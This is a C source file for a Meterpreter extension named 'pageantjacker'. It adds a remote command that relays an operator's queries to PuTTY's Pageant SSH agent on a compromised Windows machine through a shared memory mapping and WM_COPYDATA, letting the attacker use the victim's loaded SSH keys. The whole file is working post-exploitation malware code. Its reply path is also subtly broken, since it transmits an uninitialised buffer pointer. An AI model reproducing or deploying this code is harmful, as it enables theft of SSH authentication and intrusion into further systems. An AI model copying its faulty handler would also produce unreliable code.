/*!
 * @file pageantjacker.c
 * @brief Entry point and intialisation functionality for the pageantjacker extention.
 */
#include "../../common/common.h"
#include "pageantjacker.h"

#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

Command customCommands[] =
{
	COMMAND_REQ("pageant_send_query", request_pageant_send_query),
	COMMAND_TERMINATOR
};

DWORD request_pageant_send_query(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	Byte *raw_data_in, *raw_data_out;
	DWORD raw_data_size_in, raw_data_size_out;
	PAGEANTQUERYRESULTS results;

	raw_data_size_out = 8192;
	/* dprintf */
	raw_data_size_in = packet_get_tlv_value_uint(packet, TLV_META_TYPE_UINT);
	raw_data_in = packet_get_tlv_value_raw(packet, TLV_META_TYPE_RAW);

	//raw_data_out = send_query_to_pageant(raw_data_in, raw_data_size_in);
	results = send_query_to_pageant(raw_data_in, raw_data_size_in);

	packet_add_tlv_raw(response, TLV_META_TYPE_RAW, raw_data_out, raw_data_size_out);
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}


/*!
 * @brief Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->hMetSrv;

	command_register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength) {
	
	char strPuttyRequest[23];
	COPYDATASTRUCT pageant_copy_data;
	unsigned char *filemap_pointer;
	HANDLE filemap;
	PAGEANTQUERYRESULTS ret;
	HWND hPageant;

	// Initialise the result array
	memset(&ret, 0, sizeof(ret));
	ret.result = FALSE;

	hPageant = FindWindowW(PAGEANT_NAME, PAGEANT_NAME);

	// Generate the request string and populate the struct
	snprintf(&strPuttyRequest, sizeof(strPuttyRequest), "PageantRequest%08x\x00", (unsigned int) GetCurrentThreadId()); // This will always be 23 chars
	pageant_copy_data.dwData = AGENT_COPYDATA_ID;
	pageant_copy_data.cbData = sizeof(strPuttyRequest);
	pageant_copy_data.lpData = &strPuttyRequest;

	// Pageant effectively communicates with PuTTY using shared memory (in this case, a pagefile backed memory allocation).
	// It will overwrite this memory block with the result of the query.
	filemap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, AGENT_MAX, (char *) &strPuttyRequest);
	if (filemap && filemap != INVALID_HANDLE_VALUE) {
		if (filemap_pointer = MapViewOfFile(filemap, FILE_MAP_WRITE, 0, 0, 0)) {

			// Copy the request to the memory block that will be passed to Pageant.
			memcpy(filemap_pointer, query, querylength);

			// Send the request message to Pageant.
			if (SendMessage(hPageant, WM_COPYDATA, (WPARAM) NULL, (LPARAM) &pageant_copy_data)) {
				if (ret.blob = malloc(AGENT_MAX)) {
					memcpy(ret.blob, filemap_pointer, AGENT_MAX);
					ret.result = TRUE;
				} else {
					ret.error_message = PAGEANTJACKER_ERROR_ALLOC;
				}
				
			} else {
				// SendMessage failed
				ret.error_message = PAGEANTJACKER_ERROR_SENDMESSAGE;
			}
			UnmapViewOfFile(filemap_pointer);
		} else {
			// MapViewOfFile failed
			ret.error_message = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
		}
		CloseHandle(filemap);
	} else {
		// CreateFileMapping failed
		ret.error_message = PAGEANTJACKER_ERROR_CREATEFILEMAPPING;
	}

	return ret;
}

